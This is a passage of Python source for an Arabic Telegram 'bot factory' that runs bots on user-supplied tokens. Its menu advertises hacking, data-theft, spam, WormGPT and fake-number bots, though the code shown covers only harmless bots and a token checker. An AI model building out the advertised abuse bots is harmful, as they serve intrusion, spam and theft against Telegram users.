🚀 الهدف: تسهيل إنشاء البوتات للمستخدمين

📊 الإحصائيات:
• عدد البوتات المصنوعة: {}
• عدد المستخدمين: متزايد
• نسبة الرضا: 98%

⚙️ المميزات:
1. إنشاء بوتات بسهولة
2. واجهة مستخدم بسيطة
3. دعم فني متكامل
4. تحديثات مستمرة

👨‍💻 المطورون:
• المطور الرئيسي: @ELZo_z
• فريق الدعم: @ELZo_z

📞 للتواصل: @zxgbjji""".format(len(get_all_bots()))
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(
        InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"),
        InlineKeyboardButton("➕ صنع بوت", callback_data="create_new_bot")
    )
    
    factory_bot.answer_callback_query(call.id)
    factory_bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=info_text,
        reply_markup=kb
    )

@factory_bot.callback_query_handler(func=lambda call: call.data == "create_new_bot")
def choose_bot_type(call):
    if not is_factory_user_subscribed(call.from_user.id):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"),
            InlineKeyboardButton("✅ تم الاشتراك", callback_data="create_new_bot")
        )
        factory_bot.answer_callback_query(call.id)
        factory_bot.edit_message_text("🚫 <b>يجب عليك الاشتراك في قناة المطور أولاً لتتمكن من صنع بوت:</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)
        return

    factory_bot.answer_callback_query(call.id)
    kb = InlineKeyboardMarkup(row_width=2)
    
    # 📌 الصف 1: بوتات أساسية
    kb.row(
        InlineKeyboardButton("🤖 بوت الاختراق", callback_data="ask_token_index"),
        InlineKeyboardButton("🔐 بوت معلومات التوكن", callback_data="ask_token_token_info")
    )
    
    # 📌 الصف 2: بوتات ترفيهية
    kb.row(
        InlineKeyboardButton("🎲 بوت الروليت", callback_data="ask_token_roulette"),
        InlineKeyboardButton("😃 بوت التفاعل (إيموجي)", callback_data="ask_token_interaction_bot")
    )
    
    # 📌 الصف 3: بوتات إنشاء مواقع
    kb.row(
        InlineKeyboardButton("🌐 بوت إنشاء مواقع", callback_data="ask_token_website_builder"),
        InlineKeyboardButton("🌟 بوت زياد (إنشاء مواقع)", callback_data="ask_token_ziad_bot")
    )
    
    # 📌 الصف 4: بوتات إدارة وتحكم
    kb.row(
        InlineKeyboardButton("🤖 بوت تحكم التوكن", callback_data="ask_token_token_manager"),
        InlineKeyboardButton("🚀 بوت استضافة بايثون", callback_data="ask_token_hosting_bot")
    )
    
    # 📌 الصف 5: بوتات أمنية وتشفير
    kb.row(
        InlineKeyboardButton("", callback_data="ask_token_encryption_bot"),
        InlineKeyboardButton("🔮 بوت سحب داتا", callback_data="ask_token_pyramid_bot")
    )
    
    # 📌 الصف 6: بوتات أدوات وخدمات
    kb.row(
        InlineKeyboardButton("📝 بوت الكتابة على الورق", callback_data="ask_token_writing_paper"),
        InlineKeyboardButton("📂 بوت سحب ملفات المواقع", callback_data="ask_token_website_downloader")
    )
    
    # 📌 الصف 7: بوتات متقدمة
    kb.row(
        InlineKeyboardButton("💣 بوت السبام", callback_data="ask_token_spam_bot"),
        InlineKeyboardButton("🤖 بوت WormGPT", callback_data="ask_token_wormgpt")
    )
    
    # 📌 الصف 8: بوتات خدمات
    kb.row(
        InlineKeyboardButton("📧 بوت إنشاء إيميلات", callback_data="ask_token_email_bot"),
        InlineKeyboardButton("ارقام وهميه واتس ", callback_data="ask_token_numbers_bot")
    )
    
    # 📌 الصف 9: بوتات حماية
    kb.row(
        InlineKeyboardButton("🛡️ بوت حماية المصنع", callback_data="ask_token_protection_bot"),
        InlineKeyboardButton("🛠️ خدمات متعددة", callback_data="ask_token_multi_services")
    )
    
    # 📌 الصف 10: خيارات إضافية
    kb.row(
        InlineKeyboardButton("🔄 تحديث القائمة", callback_data="create_new_bot"),
        InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="back_to_main")
    )
    
    factory_bot.edit_message_text(
        "🎯 <b>مصنع البوتات المتقدم - الإصدار 2.0</b>\n\n"
        "📊 <i>اختر نوع البوت الذي تريد إنشاءه من القائمة أدناه:</i>\n"
        "────────────────────\n"
        "• 🤖 <b>بوتات أساسية وإدارية</b> (4 أنواع)\n"
        "• 🎲 <b>بوتات ترفيهية وتفاعلية</b> (3 أنواع)\n"
        "• 🌐 <b>بوتات إنشاء مواقع</b> (2 أنواع)\n"
        "• 🔒 <b>بوتات أمنية وتشفير</b> (3 أنواع)\n"
        "• 📝 <b>بوتات أدوات وخدمات</b> (3 أنواع)\n"
        "• 💣 <b>بوتات متقدمة</b> (2 أنواع)\n"
        "• 📱 <b>بوتات خدمات</b> (3 أنواع)\n"
        "────────────────────\n"
        "📈 <i>إجمالي الأنواع المتاحة: 20 نوع</i>\n"
        "⚡ <i>اختر وانشئ بوتك خلال ثواني!</i>",
        chat_id=call.message.chat.id, 
        message_id=call.message.message_id, 
        reply_markup=kb,
        parse_mode="HTML"
    )
    
@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("ask_token_"))
def ask_token(call):
    bot_type = call.data.replace("ask_token_", "")
    factory_bot.answer_callback_query(call.id)
    factory_bot.edit_message_text("📝 <b>أرسل الآن توكن البوت الذي أنشأته من BotFather.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id)
    factory_bot.register_next_step_handler(call.message, lambda msg: handle_token(msg, call.from_user.id, bot_type))

def handle_token(message, admin_id, bot_type):
    user_token = message.text.strip()
    try:
        info = requests.get(f"https://api.telegram.org/bot{user_token}/getMe").json()
        if not info["ok"]:
            factory_bot.send_message(message.chat.id, "❌ <b>التوكن غير صالح.</b>")
            return
        
        if user_token in get_all_bots():
            factory_bot.send_message(message.chat.id, "❌ <b>هذا البوت تم إنشاؤه بالفعل.</b>")
            return

        factory_bot.send_message(message.chat.id, "⏳ جاري إعداد البوت، يرجى الانتظار...")
        
        bot_data_dir = os.path.join(BOTS_DATA_DIR, user_token.replace(":", "_"))
        if not os.path.exists(bot_data_dir):
            os.makedirs(bot_data_dir)

        register_bot(user_token, admin_id, bot_type)

        thread = None
        
        # جميع أنواع البوتات الحقيقية التي لدينا
        if bot_type == "index":
            thread = threading.Thread(target=run_new_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "token_info":
            thread = threading.Thread(target=run_token_info_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "roulette":
            thread = threading.Thread(target=run_roulette_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "website_builder":
            thread = threading.Thread(target=run_website_builder_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "token_manager":
            thread = threading.Thread(target=run_token_manager_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "writing_paper":
            thread = threading.Thread(target=run_writing_paper_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "interaction_bot":
            thread = threading.Thread(target=run_interaction_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "encryption_bot":
            thread = threading.Thread(target=run_encryption_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "spam_bot":
            thread = threading.Thread(target=run_spam_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "website_downloader":
            thread = threading.Thread(target=run_website_downloader_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "pyramid_bot":
            thread = threading.Thread(target=run_pyramid_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "wormgpt":
            thread = threading.Thread(target=run_wormgpt_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "email_bot":
            thread = threading.Thread(target=run_email_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "hosting_bot":
            thread = threading.Thread(target=run_hosting_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "ziad_bot":
            thread = threading.Thread(target=run_ziad_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "numbers_bot":
            thread = threading.Thread(target=run_numbers_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "protection_bot":
            thread = threading.Thread(target=run_protection_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "multi_services":
            thread = threading.Thread(target=run_multi_services_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        else:
            factory_bot.send_message(message.chat.id, "❌ <b>هذا النوع غير مدعوم حالياً.</b>")
            return
        
        if thread:
            thread.start()
            running_bot_threads[user_token] = thread

        bot_name = info['result']['first_name']
        bot_username = info['result']['username']
        
        factory_bot.send_message(message.chat.id, f"✅ <b>تم تشغيل البوت @{bot_username} بنجاح.</b>")
    except Exception as e:
        print(f"Error in handle_token: {e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ غير متوقع.")
# ==============================================================================
# --- دالة تشغيل بوت التفاعل (Emoji Reaction Bot) ---
# ==============================================================================
def run_interaction_bot(token, owner_id, data_dir):
    """
    تشغيل بوت التفاعل (Emoji Reaction Bot)
    """
    try:
        bot = telebot.TeleBot(token, parse_mode="HTML")
        
        # إعداد ملفات البوت التفاعلي
        emoji_stats_file = os.path.join(data_dir, 'emoji_stats.json')
        reaction_index_file = os.path.join(data_dir, 'reaction_index.txt')
        
        allowed_reactions = [
            '👍', '👎', '❤️', '🔥', '😂', '🤩', '🤯', '😱', '😢', '😭',
            '😤', '🤮', '💩', '🙏', '🕊️', '🤡', '🐳', '🍾', '🎉', '💡',
            '⚡️', '🍌', '💔', '😐', '💋', '😈', '😴', '🤪', '😵', '‍💫',
            '💯', '👍🏻', '👎🏻', '🥰', '😘', '😡', '🤬', '👏', '✍️', '👀',
            'P', 'D', 'C', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
            'O', 'P', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1',
            '2', '3', '4', '5', '6', '7', '8', '9'
        ]
        
        # تهيئة الملفات إذا لم تكن موجودة
        if not os.path.exists(emoji_stats_file):
            with open(emoji_stats_file, 'w', encoding='utf-8') as f:
                json.dump({'👍': 0, '❤️': 0,'😂': 0}, f, ensure_ascii=False)
        
        if not os.path.exists(reaction_index_file):
            with open(reaction_index_file, 'w', encoding='utf-8') as f:
                f.write('0')
        
        def get_stats():
            """Load emoji statistics from JSON file"""
            try:
                with open(emoji_stats_file, 'r', encoding='utf-8') as f:
                    stats = json.load(f)
                    return stats if isinstance(stats, dict) else {}
            except (FileNotFoundError, json.JSONDecodeError):
                return {}
        
        def get_reaction_index():
            """Get current reaction index from file"""
            try:
                with open(reaction_index_file, 'r', encoding='utf-8') as f:
                    index = f.read().strip()
                    return int(index) if index.isdigit() else 0
            except FileNotFoundError:
                return 0
        
        def update_stats_and_get_reaction(text, limit=20):
            """Update emoji statistics and get next reaction emoji"""
            # Load current stats
            stats = get_stats()
            initial_emojis = {'👍': 0, '❤️': 0, '😂': 0}
            all_emojis = {**initial_emojis, **stats}
            
            # Find all emojis in text (Unicode emoji pattern)
            emoji_pattern = re.compile(
                '['
                '\U0001F600-\U0001F64F'  # emoticons
                '\U0001F300-\U0001F5FF'  # symbols & pictographs
                '\U0001F680-\U0001F6FF'  # transport & map symbols
                '\U0001F1E0-\U0001F1FF'  # flags (iOS)
                '\U00002702-\U000027B0'  # Dingbats
                '\U000024C2-\U0001F251'  # Enclosed characters
                ']+', 
                flags=re.UNICODE
            )
            
            # Count emojis in text
            emojis_found = emoji_pattern.findall(text)
            for emoji in emojis_found:
                all_emojis[emoji] = all_emojis.get(emoji, 0) + 1
            
            # Save updated stats
            with open(emoji_stats_file, 'w', encoding='utf-8') as f:
                json.dump(all_emojis, f, ensure_ascii=False)
            
            # Sort emojis by count (descending)
            sorted_emojis = sorted(all_emojis.items(), key=lambda x: x[1], reverse=True)
            
            # Filter top allowed emojis
            top_allowed_emojis = []
            for emoji, _ in sorted_emojis:
                if emoji in allowed_reactions:
                    top_allowed_emojis.append(emoji)
                    if len(top_allowed_emojis) >= limit:
                        break
            
            # Default reaction if no allowed emojis found
            if not top_allowed_emojis:
                return '👍'
            
            # Get current index and calculate next reaction
            current_index = get_reaction_index()
            num_emojis = len(top_allowed_emojis)
            
            reaction = top_allowed_emojis[current_index % num_emojis]
            
            # Update index for next cycle
            next_index = (current_index + 1) % num_emojis
            with open(reaction_index_file, 'w', encoding='utf-8') as f:
                f.write(str(next_index))
            
            return reaction
        
        @bot.message_handler(commands=['start'])
        def start_cmd(message):
            welcome_text = """😃 مرحباً بك في بوت التفاعل!
            
أنا بوت ذكي يضيف ردود فعل (إيموجيات) تلقائياً على رسائلك!

✨ كيف يعمل:
1. أرسل أي رسالة نصية
2. سأقوم بتحليل النص تلقائياً
3. سأضيف إيموجي رد فعل مناسب بناءً على محتوى رسالتك

🎯 مميزات البوت:
• تحليل تلقائي للنصوص
• اختيار إيموجيات ذكية
• تعلم من التفاعلات السابقة
• متوافق مع جميع أنواع المجموعات

🚀 ابدأ الآن بإرسال أي رسالة!"""
            
            kb = InlineKeyboardMarkup(row_width=2)
            kb.row(
                InlineKeyboardButton("📊 إحصائيات الإيموجيات", callback_data="emoji_stats"),
                InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="bot_settings")
            )
            kb.add(InlineKeyboardButton("❓ المساعدة", callback_data="help_info"))
            
            bot.send_message(message.chat.id, welcome_text, reply_markup=kb)
        
        @bot.message_handler(commands=['stats'])
        def stats_cmd(message):
            stats = get_stats()
            if not stats:
                bot.reply_to(message, "📊 لا توجد إحصائيات حتى الآن!")
                return
            
            sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
            stats_text = "📊 إحصائيات استخدام الإيموجيات:\n\n"
            
            for i, (emoji, count) in enumerate(sorted_stats[:10], 1):
                stats_text += f"{i}. {emoji}: {count} مرة\n"
            
            bot.reply_to(message, stats_text, parse_mode="Markdown")
        
        @bot.callback_query_handler(func=lambda call: call.data == "emoji_stats")
        def show_emoji_stats(call):
            stats = get_stats()
            if not stats:
                bot.answer_callback_query(call.id, "📊 لا توجد إحصائيات حتى الآن!", show_alert=True)
                return
            
            sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
            stats_text = "📊 إحصائيات استخدام الإيموجيات:\n\n"
            
            for i, (emoji, count) in enumerate(sorted_stats[:15], 1):
                stats_text += f"{i}. {emoji}: {count} مرة\n"
            
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=stats_text,
                reply_markup=kb,
                parse_mode="Markdown"
            )
        
        @bot.callback_query_handler(func=lambda call: call.data == "help_info")
        def show_help(call):
            help_text = """❓ كيفية استخدام بوت التفاعل:

1. أضف البوت إلى مجموعتك كعضو عادي
2. امنح البوت صلاحية إضافة ردود فعل
3. أرسل رسائل وسيقام البوت تلقائياً بإضافة إيموجيات مناسبة

🔧 متطلبات التشغيل:
• يجب أن يكون البوت عضو في المجموعة
• يحتاج البوت إلى صلاحية إضافة ردود فعل
• يعمل في المجموعات العامة والخاصة

⚠️ ملاحظات مهمة:
• البوت يعمل تلقائياً دون تدخل
• يتعلم من التفاعلات السابقة
• يمكنك رؤية الإحصائيات عبر /stats"""
            
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=help_text,
                reply_markup=kb,
                parse_mode="Markdown"
            )
        
        @bot.callback_query_handler(func=lambda call: call.data == "bot_settings")
        def show_settings(call):
            settings_text = """⚙️ إعدادات بوت التفاعل:

🔄 حالة البوت: ✅ نشط
📊 عدد الإيموجيات المدعومة: {}
🎯 نوع التفاعل: تلقائي بناءً على تحليل النص

🔧 خيارات متقدمة:
• ضبط حساسية الكشف عن المشاعر
• تخصيص قائمة الإيموجيات
• إدارة الإحصائيات

👨‍💻 للاستفسارات: @ELZo_z""".format(len(allowed_reactions))
            
            kb = InlineKeyboardMarkup(row_width=2)
            kb.row(
                InlineKeyboardButton("🔄 إعادة تعيين الإحصائيات", callback_data="reset_stats"),
                InlineKeyboardButton("🎯 تغيير الإيموجيات", callback_data="change_emojis")
            )
            kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=settings_text,
                reply_markup=kb,
                parse_mode="Markdown"
            )
        
        @bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
        def back_to_main(call):
            start_cmd(call.message)
        
        @bot.message_handler(func=lambda message: True)
        def handle_messages(message):
            # تخطي الرسائل من البوت نفسه
            if message.from_user.id == bot.get_me().id:
                return
            
            # الحصول على نص الرسالة
            text = message.text or message.caption or ""
            
            if not text:
                return
            
            # الحصول على رد الفعل المناسب
            reaction_emoji = update_stats_and_get_reaction(text)
            
            try:
                # إضافة رد الفعل إلى الرسالة
                bot.set_message_reaction(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reaction=[{"type": "emoji", "emoji": reaction_emoji}]
                )
                print(f"✅ Added reaction {reaction_emoji} to message in chat {message.chat.id}")
            except Exception as e:
                print(f"❌ Error adding reaction: {e}")
                # محاولة بديلة: الرد برسالة تحتوي على الإيموجي
                try:
                    bot.reply_to(message, f"{reaction_emoji}")
                except:
                    pass
        
        @bot.message_handler(content_types=['new_chat_members'])
        def welcome_new_member(message):
            # ترحيب بالأعضاء الجدد
            for new_member in message.new_chat_members:
                if new_member.id == bot.get_me().id:
                    welcome_msg = """😃 مرحباً! أنا بوت التفاعل الذكي!

سأقوم تلقائياً بإضافة ردود فعل مناسبة على رسائل المجموعة.

✨ مميزاتي:
• تحليل المشاعر في النصوص
• إضافة إيموجيات ذكية
• تعلم من التفاعلات

🚀 لبدء العمل:
1. تأكد من أن لدي صلاحية إضافة ردود فعل
2. أرسل /start لرؤية الإحصائيات
3. أرسل أي رسالة وسأتفاعل معها!

استمتع بتجربة تفاعلية ممتعة! 🎉"""
                    
                    bot.reply_to(message, welcome_msg)
                    break
        
        # بدء تشغيل البوت
        bot_username = bot.get_me().username
        print(f"✅ Interaction bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
        
    except Exception as e:
        print(f"Interaction bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- دالة تشغيل بوت الكتابة على الورق ---
# ==============================================================================
def run_writing_paper_bot(token, owner_id, data_dir):
    """
    تشغيل بوت الكتابة على الورق
    """
    bot = telebot.TeleBot(token)
    
    # زر المساعدة
    btn1 = telebot.types.InlineKeyboardButton(text="المـساعدة", callback_data="المـساعدة")
    
    @bot.message_handler(commands=["start"])
    def start(message):
        b = telebot.types.InlineKeyboardMarkup()
        b.add(btn1)
        bot.reply_to(message, text="أكتب كتابة بل لغة الانجليزية وسوف اجعلها في ورقة ", reply_markup=b)
    
    @bot.callback_query_handler(func=lambda call: True)
    def callb(call):
        bot.answer_callback_query(call.id, show_alert=True, text='''
انت في قسم المساعدة 
- وظيفة البوت هي ،

كتابة نص على الورق بخط اليد 
يعمل فقط بنصوص الغة الانجليزية
@mora_330
''')
    
    @bot.message_handler(func=lambda m: True)
    def send(message):
        msg = message.text
        url = f"https://apis.xditya.me/write?text={msg}"
        bot.send_photo(message.chat.id, url)
    
    try:
        bot_username = bot.get_me().username
        print(f"✅ Writing paper bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Writing paper bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- دالة تشغيل بوت تحكم التوكن ---
# ==============================================================================
def run_token_manager_bot(token, owner_id, data_dir):
    """
    تشغيل بوت تحكم التوكن (Token Manager)
    """
    bot = telebot.TeleBot(token)
    
    # قاموس لتخزين حالة المستخدمين
    user_states = {}
    user_tokens = {}
    
    # الحالات المختلفة
    STATE_WAITING_TOKEN = "waiting_token"
    STATE_WAITING_PHOTO = "waiting_photo"
    STATE_WAITING_NAME = "waiting_name"
    
    def check_bot_token(token):
        """فحص التوكن والحصول على معلومات البوت"""
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    bot_info = data["result"]
                    return {
                        "valid": True,
                        "username": bot_info.get("username", "غير محدد"),
                        "first_name": bot_info.get("first_name", "غير محدد"),
                        "id": bot_info.get("id", "غير محدد"),
                        "can_join_groups": bot_info.get("can_join_groups", False),
                        "can_read_all_group_messages": bot_info.get(
                            "can_read_all_group_messages", False
                        ),
                        "supports_inline_queries": bot_info.get(
                            "supports_inline_queries", False
                        ),
                    }
            
            return {"valid": False, "error": "التوكن غير صحيح أو البوت غير موجود"}
        
        except requests.exceptions.Timeout:
            return {"valid": False, "error": "انتهت مهلة الاتصال"}
        except requests.exceptions.RequestException:
            return {"valid": False, "error": "خطأ في الاتصال بالإنترنت"}
        except Exception as e:
            return {"valid": False, "error": f"خطأ غير متوقع: {str(e)}"}
    
    def get_bot_creation_time(bot_id):
        """حساب تاريخ إنشاء البوت التقريبي من ال ID"""
        try:
            timestamp = (int(bot_id) >> 32) + 1293840000
            creation_date = datetime.datetime.fromtimestamp(timestamp)
            return creation_date.strftime("%Y-%m-%d %H:%M:%S")
        except:
            return "غير محدد"
    
    def create_main_keyboard():
        """لوحة المفاتيح الرئيسية"""
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row(
            telebot.types.KeyboardButton("🔍 فحص توكن"),
            telebot.types.KeyboardButton("📊 إحصائيات")
        )
        keyboard.row(
            telebot.types.KeyboardButton("❓ مساعدة"),
            telebot.types.KeyboardButton("⚙️ إعدادات")
        )
        return keyboard
    
    def create_token_actions_keyboard():
        """لوحة مفاتيح إجراءات التوكن"""
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        keyboard.row(
            telebot.types.InlineKeyboardButton(
                "📸 تغيير الصورة", callback_data="change_photo"
            ),
            telebot.types.InlineKeyboardButton(
                "✏️ تغيير الاسم", callback_data="change_name"
            )
        )
        keyboard.row(
            telebot.types.InlineKeyboardButton(
                "🔄 إعادة فحص", callback_data="recheck_token"
            ),
            telebot.types.InlineKeyboardButton(
                "🗑️ مسح الصورة", callback_data="delete_photo"
            )
        )
        return keyboard
    
    @bot.message_handler(commands=["start"])
    def start(message):
        user_id = message.from_user.id
        user_states[user_id] = None
        
        welcome_text = f"""🤖 مرحباً بك في بوت فحص التوكنات!
        
👋 أهلاً {message.from_user.first_name}
        
🔍 هذا البوت يساعدك في:
• فحص صحة توكنات البوتات
• عرض معلومات تفصيلية عن البوت
• تغيير صورة وأسماء البوتات
• إحصائيات مفيدة
        
⚠ ملاحظه مهمه ممكن امر تغيير الصورة لا يعمل ببعض البوتات
        
📝 لبدء الفحص، اضغط على "فحص توكن" أو أرسل /check"""
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=create_main_keyboard())
    
    @bot.message_handler(commands=["check"])
    def check_command(message):
        request_token(message)
    
    @bot.message_handler(func=lambda message: message.text == "🔍 فحص توكن")
    def request_token(message):
        user_id = message.from_user.id
        user_states[user_id] = STATE_WAITING_TOKEN
        
        bot.send_message(
            message.chat.id,
            "🔑 أرسل التوكن الذي تريد فحصه:\n\n"
            "مثال: 123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\n"
            "⚠️ تأكد من صحة التوكن قبل الإرسال",
            reply_markup=telebot.types.ReplyKeyboardRemove(),
        )
    
    @bot.message_handler(func=lambda message: message.text == "📊 إحصائيات")
    def show_stats(message):
        stats_text = f"""📊 إحصائيات البوت:
        
👥 عدد المستخدمين: {len(user_states)}
🔍 عدد التوكنات المفحوصة: {len(user_tokens)}
⏰ وقت التشغيل: منذ بدء الجلسة
🌟 حالة البوت: يعمل بشكل طبيعي
        
💡 نصائح:
• احتفظ بتوكناتك في مكان آمن
• لا تشارك التوكنات مع أشخاص غير موثوقين
• قم بفحص التوكنات بانتظام"""
        
        bot.send_message(message.chat.id, stats_text, reply_markup=create_main_keyboard())
    
    @bot.message_handler(func=lambda message: message.text == "❓ مساعدة")
    def show_help(message):
        help_text = """❓ مساعدة استخدام البوت:
        
🔍 فحص توكن:
• اضغط على "فحص توكن" أو أرسل /check
• أرسل التوكن الخاص بالبوت
• ستحصل على معلومات شاملة عن البوت
        
🔄 تغيير إعدادات البوت:
• بعد فحص التوكن، اضغط على الأزرار
• يمكنك تغيير الصورة والاسم
        
📸 تغيير الصورة:
• اضغط على "تغيير الصورة"
• أرسل الصورة الجديدة
        
✏️ تغيير الاسم:
• اضغط على "تغيير الاسم"
• أرسل الاسم الجديد
        
💡 نصائح مهمة:
• تأكد من صحة التوكن
• استخدم صور عالية الجودة
• اختر أسماء واضحة للبوتات"""
        
        bot.send_message(message.chat.id, help_text, reply_markup=create_main_keyboard())
    
    @bot.message_handler(func=lambda message: message.text == "⚙️ إعدادات")
    def show_settings(message):
        settings_text = """⚙️ إعدادات البوت:
        
🔧 الإعدادات المتاحة:
• تنظيف سجل التوكنات
• إعادة تعيين حالة المستخدم
• عرض آخر توكن مفحوص
        
📝 لتنظيف البيانات أرسل: /clear
🔄 لإعادة التعيين أرسل: /reset"""
        
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        keyboard.row(
            telebot.types.InlineKeyboardButton(
                "🗑️ تنظيف البيانات", callback_data="clear_data"
            ),
            telebot.types.InlineKeyboardButton(
                "🔄 إعادة تعيين", callback_data="reset_state"
            )
        )
        
        bot.send_message(message.chat.id, settings_text, reply_markup=keyboard)
    
    @bot.message_handler(
        func=lambda message: user_states.get(message.from_user.id) == STATE_WAITING_TOKEN
    )
    def handle_token(message):
        user_id = message.from_user.id
        token = message.text.strip()
        
        # فحص تنسيق التوكن الأساسي
        if ":" not in token or len(token) < 35:
            bot.send_message(
                message.chat.id,
                "❌ تنسيق التوكن غير صحيح!\n\n"
                "التوكن يجب أن يكون بهذا الشكل:\n"
                "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                reply_markup=create_main_keyboard(),
            )
            user_states[user_id] = None
            return
        
        # إرسال رسالة تحميل
        loading_msg = bot.send_message(message.chat.id, "🔍 جاري فحص التوكن...")
        
        # فحص التوكن
        result = check_bot_token(token)
        
        bot.delete_message(message.chat.id, loading_msg.message_id)
        
        if result["valid"]:
            # حفظ التوكن للمستخدم
            user_tokens[user_id] = token
            user_states[user_id] = None
            
            bot_info = result
            creation_time = get_bot_creation_time(bot_info["id"])
            
            # إنشاء رسالة النتيجة
            result_text = f"""✅ التوكن صحيح!
            
🤖 معلومات البوت:
• الاسم: {bot_info['first_name']}
• اليوزرنيم: @{bot_info['username']}
• الآيدي: {bot_info['id']}
• تاريخ الإنشاء: {creation_time}
            
⚙️ الصلاحيات:
• انضمام للمجموعات: {'✅' if bot_info['can_join_groups'] else '❌'}
• قراءة جميع الرسائل: {'✅' if bot_info['can_read_all_group_messages'] else '❌'}
• الاستعلامات المضمنة: {'✅' if bot_info['supports_inline_queries'] else '❌'}
            
🎯 اختر العملية التي تريد تنفيذها:"""
            
            bot.send_message(
                message.chat.id, result_text, reply_markup=create_token_actions_keyboard()
            )
        
        else:
            bot.send_message(
                message.chat.id,
                f"❌ فشل فحص التوكن!\n\n"
                f"السبب: {result['error']}\n\n"
                "تأكد من:\n"
                "• صحة التوكن\n"
                "• أن البوت لم يتم حذفه\n"
                "• الاتصال بالإنترنت",
                reply_markup=create_main_keyboard(),
            )
            user_states[user_id] = None
    
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback(call):
        user_id = call.from_user.id
        
        if call.data == "change_photo":
            if user_id not in user_tokens:
                bot.answer_callback_query(call.id, "❌ لم يتم العثور على توكن محفوظ!")
                return
            
            user_states[user_id] = STATE_WAITING_PHOTO
            bot.send_message(
                call.message.chat.id,
                "📸 أرسل الصورة الجديدة التي تريد تعيينها للبوت:\n\n"
                "⚠️ تأكد من أن الصورة:\n"
                "• عالية الجودة\n"
                "• مناسبة للبوت\n"
                "• أقل من 10 ميجابايت",
            )
            bot.answer_callback_query(call.id, "📸 أرسل الصورة الجديدة")
        
        elif call.data == "change_name":
            if user_id not in user_tokens:
                bot.answer_callback_query(call.id, "❌ لم يتم العثور على توكن محفوظ!")
                return
            
            user_states[user_id] = STATE_WAITING_NAME
            bot.send_message(
                call.message.chat.id,
                "✏️ أرسل الاسم الجديد للبوت:\n\n"
                "📝 الاسم يمكن أن يكون:\n"
                "• من 1 إلى 64 حرف\n"
                "• يحتوي على أحرف وأرقام ورموز\n"
                "• واضح ومفهوم",
            )
            bot.answer_callback_query(call.id, "✏️ أرسل الاسم الجديد")
        
        elif call.data == "recheck_token":
            if user_id in user_tokens:
                token = user_tokens[user_id]
                result = check_bot_token(token)
                
                if result["valid"]:
                    bot.answer_callback_query(call.id, "✅ التوكن ما زال صحيحاً!")
                else:
                    bot.answer_callback_query(call.id, "❌ التوكن لم يعد صحيحاً!")
            else:
                bot.answer_callback_query(call.id, "❌ لم يتم العثور على توكن محفوظ!")
        
        elif call.data == "delete_photo":
            if user_id not in user_tokens:
                bot.answer_callback_query(call.id, "❌ لم يتم العثور على توكن محفوظ!")
                return
            
            token = user_tokens[user_id]
            try:
